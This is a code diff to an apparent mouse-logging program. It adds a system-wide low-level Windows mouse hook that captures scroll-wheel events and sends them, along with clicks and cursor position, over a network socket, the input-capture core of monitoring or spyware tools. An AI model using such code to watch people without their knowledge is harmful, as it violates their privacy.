@@ -1,5 +1,8 @@
 #include "MouseLogger.h"
 
+SOCKET _mouseSock;
+HHOOK _globalMouseHook = NULL;
+
 MouseLogger::MouseLogger() {}
 
 MouseLogger::~MouseLogger() {}
@@ -28,19 +31,52 @@ void MouseLogger::recordMouseClicks(SOCKET sock)
 		{
 			msg = "<scroll-click>";
 		}
-		else if (keyPressed(VK_UP))
-		{
-			msg = "<scroll-up>";
-		}
-		else if (keyPressed(VK_DOWN))
-		{
-			msg = "<scroll-down>";
-		}
 
 		std::cout << msg;
 		send(sock, msg.c_str(), msg.length(), 0);
 	}
 }
+
+
+LRESULT CALLBACK MouseLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	std::string scroll_event = "";
+
+	if (nCode == HC_ACTION)
+	{
+		MSLLHOOKSTRUCT* pMouseStruct = (MSLLHOOKSTRUCT*)lParam;
+
+		if (wParam == WM_MOUSEWHEEL)
+		{
+			// Extract the scroll delta from the wParam
+			short delta = GET_WHEEL_DELTA_WPARAM(pMouseStruct->mouseData);
+
+			// finding if the scroll is up/down:
+			if (delta > 0)
+				scroll_event = "<scroll-up>";
+			else
+				scroll_event = "<scroll-down>";
+		}
+	}
+
+	std::cout << scroll_event;
+	send(_mouseSock, scroll_event.c_str(), scroll_event.length(), 0);
+	return CallNextHookEx(_globalMouseHook, nCode, wParam, lParam);
+}
+
+void MouseLogger::recordScrollBar(SOCKET sock)
+{
+	_mouseSock = sock;
+
+	_globalMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseLogger::startListen, 0, 0);
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	UnhookWindowsHookEx(_globalMouseHook);
+}
+
 
 // function returns if 2 POINTS are equal
 bool compareCoordinates(POINT a, POINT b) { return (a.x == b.x && a.y == b.y); }
@@ -50,7 +86,7 @@ void MouseLogger::recordMousePos(SOCKET sock)
 	POINT currPos;
 	POINT tempPos;
 
-	GetCursorPos(&currPos);`
+	GetCursorPos(&currPos);
 	while (true)
 	{
 		std::string msg = "";
